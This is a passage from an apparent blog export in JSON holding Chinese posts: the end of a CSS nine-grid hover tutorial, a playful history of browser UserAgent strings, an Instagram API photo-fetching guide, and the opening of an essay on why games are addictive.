\nhtml：\n```html\n\t<div id=\"test1\">\n\t\t<table>\n\t\t\t<tr>\n\t\t\t\t<td><span>1</span></td>\n\t\t\t\t<td><span>2</span></td>\n\t\t\t\t<td><span>3</span></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td><span>4</span></td>\n\t\t\t\t<td><span>5</span></td>\n\t\t\t\t<td><span>6</span></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td><span>7</span></td>\n\t\t\t\t<td><span>8</span></td>\n\t\t\t\t<td><span>9</span></td>\n\t\t\t</tr>\n\t\t</table>\n\t</div>\n```\ncss：\n```css\n\t*{\n\t\tmargin:0;\n\t\tpadding: 0;\n\t}\n\ttable{\n\t\tborder-collapse: collapse;\n\t}\n\t#test1 td{\n\t\twidth: 50px;\n\t\theight: 50px;\n\t\tbackground: #eee;\n\t\tposition: relative;\n\t\tborder: 5px solid #00f;\n\t\ttext-align: center;\n\t}\n\t#test1 td span{\n\t\tcolor: #090;\n\t\tdisplay:block;\n\t\twidth: 50px;\n\t\theight: 50px;\n\t\tposition: absolute;\n\t\ttop: 0;\n\t\tleft: 0;\n\t\tline-height: 50px;\n\t}\n\t#test1 td span:hover{\n\t\tborder: 5px solid #f00;\n\t\tmargin-top:-5px;\n\t\tmargin-left: -5px;\n\t}\n```\n别忘了span在hover时，必须设置一个负的<code>margein-top</code>和<code>margein-left</code>，以保证红色边框恰好定位在格子四周。见css君最后的片段。假如不设置，你看到的将是这样：    \n![未设置span:hover的margin](/assets/blogImg/jiugongge5.jpg)      \n本以为已经大功告成了，在IE中测试却让我傻了眼：     \n![IE7下的情景](/assets/blogImg/jiugongge6.jpg)    \n（ps：作为前端一枚，我已经做好了妥妥的心理准备，但此情此景还是让人喷出一口老血……）\n\n##**改进，改进**         \n\n说实话，table和div之争这么多年，大家都在页面中用越来越多的div，而越发的鄙视table，反而对table的熟悉程度反应了前端们的基础是否扎实。吃一堑长一智，这句话特别适用于在table中翻江倒海的亲们。\n\n改进！\n\n首先这个bug（也无所谓是不是bug，算是浏览器的差异性吧）我知道，在table的td里面设置了<code>position:relative;</code>就会在IE中出现这样的情况。注意是所有的IE哦，包括IE10。而根据第二个思路，最后的hover定位的元素为span，它本身设定为<code>position:absolute;</code>它的父级元素必须得设置<code>position:relative;</code>才能完成题目功能，这是毋庸置疑的。\n\n既然现在span的父级td不能设置<code>position:relative;</code>，我就在它们之间添加一个div，用来做span的容器。 \n\n代码君再一次来了：        \nhtml:\n```html\n\t<div id=\"test2\">\n\t\t<table>\n\t\t\t<tr>\n\t\t\t\t<td><div><span>1</span></div></td>\n\t\t\t\t<td><div><span>2</span></div></td>\n\t\t\t\t<td><div><span>3</span></div></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td><div><span>4</span></div></td>\n\t\t\t\t<td><div><span>5</span></div></td>\n\t\t\t\t<td><div><span>6</span></div></td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td><div><span>7</span></div></td>\n\t\t\t\t<td><div><span>8</span></div></td>\n\t\t\t\t<td><div><span>9</span></div></td>\n\t\t\t</tr>\n\t\t</table>\n\t</div>\n```\ncss:\n```css\n\t*{\n\t\tmargin:0;\n\t\tpadding: 0;\n\t}\n\ttable{\n\t\tborder-collapse: collapse;\n\t}\n\t#test2 td{\n\t\twidth: 50px;\n\t\theight: 50px;\n\t\tbackground: #eee;\n\t\tborder: 5px solid #00f;\n\t\ttext-align: center;\n\t\tvertical-align: top;\n\t}\n\t#test2 td div{\n\t\tposition:relative;\n\t\twidth: 50px;\n\t\theight: 50px;\n\t}\n\t#test2 td div span{\n\t\tcolor: #090;\n\t\tdisplay:block;\n\t\twidth: 50px;\n\t\theight: 50px;\n\t\tposition: absolute;\n\t\ttop: 0;\n\t\tleft: 0;\n\t\tline-height: 50px;\n\t}\n\t#test2 td div span:hover{\n\t\tborder: 5px solid #f00;\n\t\tmargin-left: -5px;\n\t\tmargin-top: -5px;\n\t}\n```\nOK，效果达成！           \n![最终完成的效果](/assets/blogImg/jiugongge7.jpg)      \n可以猛点这里看看[demo](/assets/demo/jiugongge_demo.html)。        \n\n**最后吐槽，不对，总结一下下：**           \n\n> 先到IE上去测，再转到其它浏览器，以少走弯路，这叫擒贼先擒王-_-!；        \n> win8的metro布局最近挺流行的，有时候table比div好用；          \n> IE君，你真是……此处省略1024个字                \n\n这个系列打算写两篇文章，下一篇介绍另外一种更简洁的方法。:)","slug":"css-jiugongge","updated":1409149757000,"excerpt":"<p>前段时间，我的 leader Henry在群里面分享了一道<a href=\"http://www.etao.com/\" target=\"_blank\" rel=\"external\">一淘</a>的面试题。         题目非常的有趣，忙完前阵的工作之后突然记起，也尝试做了一下。</p>\n<blockquote>\n<p>9个元素，每个50*50px，排成九宫格<br>默认是border颜色为blue，hover到格子上变成red（兼容到IE6）</p>\n</blockquote>\n<p><img src=\"/assets/blogImg/jiugongge1.jpg\" alt=\"css题目\">    </p>\n<p>","_id":"qau4akq5o3g12z9o","categories":[],"photos":[],"link":""},{"layout":"post","title":"浏览器野史 UserAgent列传（上）","date":1411701960000,"comments":true,"tags":["ejm72ndmomwgbvme","tl6ojb17wh8ofhtp"],"brief":"关于UserAgent的一篇野史","content":"<p><img src=\"/assets/blogImg/browser-history.jpg\" alt=\"其实应该叫做浏览器约架史\">   </p>\n<p>某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。<br>控制台敲下：<code>navigator.userAgent</code><br>浏览器回应：<code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36</code></p>\n<p>天，这串是啥？你怎么连话都说不清楚？</p>\n<p>我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。</p>\n<p>后来我查阅了很多资料，发现历史非常的精彩。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"大事年表\">大事年表</h3>\n<ul>\n<li>1990年: Nexus(WorldWideWeb)诞生</li>\n<li>1993年1月23日：Mosaic诞生</li>\n<li>1994年12月：Netscape(Mozilla)诞生</li>\n<li>1995年4月：Opera诞生</li>\n<li>1995年8月16日：Internet Explorer诞生</li>\n<li>2002年9月23日：Firefox诞生</li>\n<li>2003年1月7日：Safari诞生</li>\n<li>2008年9月2日：Chrome诞生</li>\n</ul>\n<h3 id=\"一、盘古开天地\">一、盘古开天地</h3>\n<p>很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？<br>但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？</p>\n<p>万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？<br>行行行。</p>\n<p>虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。</p>\n<p>但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。</p>\n<h3 id=\"二、唐尧虞舜\">二、唐尧虞舜</h3>\n<p>93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。<br>真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？<br>但大神就是大神，大神就是连起名字都让你惊心动魄。</p>\n<p>NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？<br>行行行。  </p>\n<p>但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？</p>\n<p>因而UserAgent就诞生了。Mosaic将自己标志为<code>NCSA_Mosaic/2.0 (Windows 3.1)</code>，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。</p>\n<p>新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。</p>\n<h3 id=\"三、楚汉争霸\">三、楚汉争霸</h3>\n<p>像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。<br>如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。</p>\n<p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？<br>但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。<br>大神们说，叫Mozilla，不行么？<br>行。但什么意思呢？</p>\n<p>含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，”Mosaic Killa”之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。  </p>\n<p>惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！”</p>\n<p>鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成<code>Mozilla/1.0 (Win3.1)</code>。还是摸咋了？咬我？</p>\n<h3 id=\"四、宋元之战\">四、宋元之战</h3>\n<p>很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。<br>NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。  </p>\n<p>NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。</p>\n<p>微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？<br>不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。</p>\n<p>IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成<code>Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)</code>。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！</p>\n<p>当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。</p>\n<h3 id=\"五、康乾盛世\">五、康乾盛世</h3>\n<p>看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。</p>\n<p>真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？<br>但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。<br>Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？<br>真不行。</p>\n<p>刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。<br>Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？<br>我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。</p>\n<p>但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。     </p>\n<p>基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为<code>Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0</code>。<br>这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。</p>\n<p>时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。<br>然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。</p>\n<hr>\n<p><a href=\"/2014/10/05/history-of-browser-useragent2/\">《浏览器野史 UserAgent列传（下）》</a></p>\n<p>To Be Continue.<br>litten 2014.9.28</p>\n","source":"_posts/history-of-browser-useragent.markdown","raw":"---\nlayout: post\ntitle: \"浏览器野史 UserAgent列传（上）\"\ndate: 2014-09-26 11:26\ncomments: true\ntags:\n     - web\n     - 浏览器\nbrief: \"关于UserAgent的一篇野史\"\n\n---    \n![其实应该叫做浏览器约架史](/assets/blogImg/browser-history.jpg)   \n\n某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。\n控制台敲下：``navigator.userAgent``\n浏览器回应：``Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36``\n\n天，这串是啥？你怎么连话都说不清楚？\n\n我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。\n\n后来我查阅了很多资料，发现历史非常的精彩。\n\n<!--more-->\n\n###大事年表\n* 1990年: Nexus(WorldWideWeb)诞生\n* 1993年1月23日：Mosaic诞生\n* 1994年12月：Netscape(Mozilla)诞生\n* 1995年4月：Opera诞生\n* 1995年8月16日：Internet Explorer诞生\n* 2002年9月23日：Firefox诞生\n* 2003年1月7日：Safari诞生\n* 2008年9月2日：Chrome诞生\n\n###一、盘古开天地\n很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？\n但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？\n\n万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？\n行行行。\n\n虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。\n\n但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。\n\n###二、唐尧虞舜\n93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。\n真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？\n但大神就是大神，大神就是连起名字都让你惊心动魄。\n\nNCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？\n行行行。  \n\n但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？\n\n因而UserAgent就诞生了。Mosaic将自己标志为``NCSA_Mosaic/2.0 (Windows 3.1)``，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。\n\n新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。\n\n###三、楚汉争霸\n像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。\n如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。\n\n真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？\n但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。\n大神们说，叫Mozilla，不行么？\n行。但什么意思呢？\n\n含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，\"Mosaic Killa\"之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。  \n\n惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！”\n\n鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成``Mozilla/1.0 (Win3.1)``。还是摸咋了？咬我？\n\n###四、宋元之战\n很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。\nNetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。  \n\nNetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。\n\n微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？\n不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。\n\nIE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成``Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)``。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！\n\n当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。\n\n###五、康乾盛世\n\n看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。\n\n真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？\n但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。\nMozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？\n真不行。\n\n刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。\nMozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？\n我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。\n\n但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。     \n\n基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为``Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0``。\n这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。\n\n时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。\n然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。\n\n--------------------\n\n[《浏览器野史 UserAgent列传（下）》](/2014/10/05/history-of-browser-useragent2/)\n\nTo Be Continue.\nlitten 2014.9.28\n","slug":"history-of-browser-useragent","updated":1412682695000,"excerpt":"<p><img src=\"/assets/blogImg/browser-history.jpg\" alt=\"其实应该叫做浏览器约架史\">   </p>\n<p>某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。<br>控制台敲下：<code>navigator.userAgent</code><br>浏览器回应：<code>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36</code></p>\n<p>天，这串是啥？你怎么连话都说不清楚？</p>\n<p>我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。</p>\n<p>后来我查阅了很多资料，发现历史非常的精彩。</p>\n","_id":"yw1rno2sveoqpnj4","categories":[],"photos":[],"link":""},{"layout":"post","title":"instagram图片拉取小经验","date":1393858320000,"comments":true,"tags":["ejm72ndmomwgbvme","m2730xmh9x3etkqg","96gic1u1hsdmtnbu"],"content":"<p>最近喜欢上了instagram，分享一下获取照片的经验。<br><a id=\"more\"></a></p>\n<h3 id=\"一、三“步”曲\">一、三“步”曲</h3>\n<p>instagram开放了API，授权遵循Oauth2.0协议。        </p>\n<h4 id=\"1、注册client_id\">1、注册client id</h4>\n<p>到<a href=\"http://instagram.com/developer/clients/manage/\" target=\"_blank\" rel=\"external\">管理客户端页面</a>，选择“注册新客户端”。<br>这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面：<br><img src=\"/assets/blogImg/instagram1.jpg\" alt=\"填写信息\"><br>按照字面意思填写完毕，client id就注册完毕了。                 </p>\n<p><img src=\"/assets/blogImg/instagram2.jpg\" alt=\"获得client_id\">         </p>\n<h4 id=\"2、用client_id去换取token\">2、用client_id去换取token</h4>\n<p>在浏览器中请求：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">https://instagram.com/oauth/authorize/?<span class=\"variable\">client_id=</span>{CLIENT_ID}&<span class=\"variable\">redirect_uri=</span>{REDIRECT_URI}&<span class=\"variable\">response_type=</span>token</div></pre></td></tr></table></figure>\n\n<p>花括号里面的值，对应上一步最终得到的<code>client_id</code>和自己设定的<code>redirect_uri</code>。<br>请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。</p>\n<h4 id=\"3、用token去调用API\">3、用token去调用API</h4>\n<p>拿到token，就等于拿到仓库的钥匙了！<br>赶紧试着用token调用api查看自己的图片吧：</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">https://api.instagram.com/v1/users/<span class=\"list\">{USER_ID}</span>/media/recent/?access_token=<span class=\"list\">{TOKEN}</span></div></pre></td></tr></table></figure>\n\n<p>这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。<br>结果错了。</p>\n<p>后来发现有这个的网站：<a href=\"http://jelled.com/instagram/lookup-user-id\" target=\"_blank\" rel=\"external\">lookup-user-id</a>，通过此业界良心，成功获取到user_id，摆平了上面的请求。</p>\n<h3 id=\"二、参考\">二、参考</h3>\n<ol>\n<li>更多功能可参考<a href=\"http://instagram.com/developer/endpoints/users/\" target=\"_blank\" rel=\"external\">api文档</a></li>\n<li>如果想了解Oauth授权，<a href=\"/blog/2013/08/20/oauth-rabbit/\">点此</a></li>\n</ol>\n<h3 id=\"三、再说两句\">三、再说两句</h3>\n<p>图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。</p>\n<p>事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。</p>\n<p>不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。</p>\n<p><strong>“你想做什么，你就会进入什么样的圈子”</strong>，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。</p>\n<p>the end.<br>litten 2014.3.3</p>\n","source":"_posts/instagram-api-ex.markdown","raw":"---\nlayout: post\ntitle: \"instagram图片拉取小经验\"\ndate: 2014-03-03 22:52\ncomments: true\ntags: \n\t- web \n\t- 经验 \n\t- 产品\n---       \n\n最近喜欢上了instagram，分享一下获取照片的经验。\n<!-- more -->\n###一、三“步”曲\ninstagram开放了API，授权遵循Oauth2.0协议。        \n####1、注册client id\n到[管理客户端页面](http://instagram.com/developer/clients/manage/)，选择“注册新客户端”。   \n这时会提示你填手机号，接着会收到短信验证码。经过验证，就到达了下面的界面：\n![填写信息](/assets/blogImg/instagram1.jpg)         \n按照字面意思填写完毕，client id就注册完毕了。                 \n\n![获得client_id](/assets/blogImg/instagram2.jpg)         \n\n####2、用client_id去换取token\n在浏览器中请求：\n```\n    https://instagram.com/oauth/authorize/?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=token\n```\n花括号里面的值，对应上一步最终得到的`client_id`和自己设定的`redirect_uri`。          \n请求到的是一个授权页面，授权完毕后，则重定向到你的redirect_uri。注意看授权成功后的url，hash部分会附带给你的token。至此，token成功获取。\n\n####3、用token去调用API\n\n拿到token，就等于拿到仓库的钥匙了！  \n赶紧试着用token调用api查看自己的图片吧：\n```\n    https://api.instagram.com/v1/users/{USER_ID}/media/recent/?access_token={TOKEN}\n```\n这时，你会发现似乎…被instagram api坑了一道。user_id是个啥？机智如我，果断填上了自己的用户名。\n结果错了。\n\n后来发现有这个的网站：[lookup-user-id](http://jelled.com/instagram/lookup-user-id)，通过此业界良心，成功获取到user_id，摆平了上面的请求。\n\n###二、参考\n1. 更多功能可参考[api文档](http://instagram.com/developer/endpoints/users/)\n2. 如果想了解Oauth授权，[点此](/blog/2013/08/20/oauth-rabbit/)\n\n###三、再说两句\n图片分享的网站万万千，instagram却只有一个。我不是此产品的脑残粉，只是觉得社区氛围这种东西，可意会而不可言传，它是社交产品的灵魂。不是每个功能相近的产品都能营造的。\n\n事实上，instagram有很多限制，或者大家称之“功能不完善”的地方。比如，在pc上浏览网站，居然不能发图片，不能看自己关注的人，或者有哪些粉丝。这都限制死了，何以称为社交？但换个角度来想，这样就“强迫”用户去用手机操作instagram，因为产品最想想表达的，就是用摄影去快速记录生活，而已。\n\n不用拓展业务的噱头去损坏产品的思想表达，不刻意向老板汇报我们新增了多少用户量。\n\n**“你想做什么，你就会进入什么样的圈子”**，这句话，不单单是对用户而言，每个创造者心中都应有这样的思考。\n\nthe end.        \nlitten 2014.3.3","slug":"instagram-api-ex","updated":1409364833000,"excerpt":"<p>最近喜欢上了instagram，分享一下获取照片的经验。<br>","_id":"bx203bf5ozwskwbz","categories":[],"photos":[],"link":""},{"layout":"post","title":"谈谈人为何会沉迷游戏？","date":1383821700000,"comments":true,"tags":["96gic1u1hsdmtnbu","jc0qt8cakht35ew1"],"brief":"读《通用设计法则》","content":"<p>为何人会沉迷？这个模型很有意思。</p>\n<p><img src=\"/assets/blogImg/immersion.png\" alt=\"沉浸的模型\"></p>\n<blockquote>\n<p>当人在“得到技能提升”和“获得挑战后的成就感”这两者中得到一定平衡时，就会陷入沉迷，这个平衡的范围称之为“心流”（flow）。人处在心流状态下，就会陷入沉迷。              </p>\n</blockquote>\n<p><a id=\"more\"></a></p>\n<h2 id=\"“lol，那是小学生玩的”\"><strong>“lol，那是小学生玩的”</strong></h2>\n<p>试想一局dota为何引人专注？完成击杀或最后胜利时你会获得挑战后的成就感，而无疑你的技术又在游戏中越发娴熟。两者共同作用，人陷其中，几局dota就让一天过去了。事实上，任何成功的游戏都是这样，不会难度超大（否则人会焦虑），也不会让人得不到技能和熟练度的提升（否则人会无聊）。这也解释了为何部分dota玩家谈起lol时，会不屑的说：“那是小学生玩的”。因为dota和lol属同类型游戏，一个熟练的dota玩家的技能维度已经较高，自然在转移到lol后得不到太大的提升，因此偏离了心流通道，使人觉得无趣。如何能合适引导这批玩家呢？唯有做好差异化。只要有不同的玩法和细节，就能让人形成新的技能增长点。这点我认为lol还是做得很不错的。</p>\n<p>再说下11平台为何会打败老牌的竞技平台，独树一帜。自然有人说，是因为匹配系统。是的，更深层次的说，是它适配了玩家的挑战水平。在浩方的时候，小白被高手虐得体无完肤的故事喜闻乐见。无疑，对任何人而言，挑战度不合适会给人带来焦虑和恐惧。匹配系统做的事情，其实是把挑战维度稳定在心流通道范围里。</p>\n<h2 id=\"赌博，最伟大的游戏\"><strong>赌博，最伟大的游戏</strong></h2>\n<p>细分起来，人的沉迷场景其实有两种：感性和认知。举个栗子，迪士尼乐园的过山车，克服心理恐惧是个挑战，而坐过几次后不再那么害怕属于技能增长，但两者存在于感性层面，是精神的主观感受；百家讲坛，许多人喜欢看，讲的东西我们可能压根不懂，可谓之挑战，而知识的渗透关系到技能，但此过程是跟过山车不一样的，人有学到东西，有认知层面的提升。</p>\n<p>再细究一下，我们不会每周都去玩过山车，也不会说百家讲坛一集不落的都看。因为他们还不足以让人沉迷。真正能让人沉迷的，必须是“感性”和“认知”两个维度高度统一的场景。facebook上常年居首的第三方应用是德州扑克，国内用户量最大的是QQ游戏大厅，小城镇六合彩屡禁不止，打麻将俨然已冲出国门走向世界。我想说的是——赌博，是最伟大的游戏之一。无论是真实的或变相的，无论历史还是现在，不同年龄段的人都会沉浸其中。源于它扼紧了人性的弱点，又是感性和认知的高度统一。</p>\n<p>举斗地主为例子，认知层面就是你牌技的增长，一个新手是很难对付牌场老手的。通过反复的练习，人可以对形势做出更正确的判断。有个朋友就告诉过我，他觉得斗地主是一门艺术。艺术一词，可能过于高贵，但足以概况了人对掌握了更高级技术所带来的满足感。那么感性层面怎么体现呢，就在于游戏的随机性。你给我一副绝世好牌，即使我再